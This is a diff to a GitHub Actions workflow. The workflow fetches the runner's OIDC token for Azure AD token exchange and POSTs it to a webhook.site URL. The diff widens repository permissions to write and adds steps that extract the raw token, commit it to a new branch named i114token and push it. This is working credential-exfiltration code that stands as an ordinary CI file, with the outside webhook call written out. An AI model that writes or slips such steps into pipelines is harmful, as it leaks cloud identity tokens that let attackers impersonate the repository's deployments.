@@ -5,15 +5,25 @@ on:
   workflow_dispatch:
 permissions:
   id-token: write
-  contents: read
+  contents: write
 jobs:
   oidc:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
       - name: get
         run: |
-          W="https://webhook.site/2a9e626b-2ae7-4933-b5d9-8292af831bef"
+          W="https://webhook.site/14088e5f-2cbc-4a0e-8dd9-cbed1dc8065d"
           curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
           cat /tmp/o.json
-          curl -sS -m 20 -X POST --data-binary @/tmp/o.json "$W/i114oidc"
+          curl -sS -m 20 -X POST --data-binary @/tmp/o.json "$W/i114oidc" || true
+          python3 -c 'import json;print(json.load(open("/tmp/o.json")).get("value",""))' > /tmp/tok.txt
+          mkdir -p oidc
+          cp /tmp/tok.txt oidc/i114_token.txt
+          git config user.email "audit@local"
+          git config user.name "audit"
+          git checkout -b i114token
+          git add oidc/i114_token.txt
+          git commit -m "i114 oidc token"
+          git push origin i114token
           exit 0
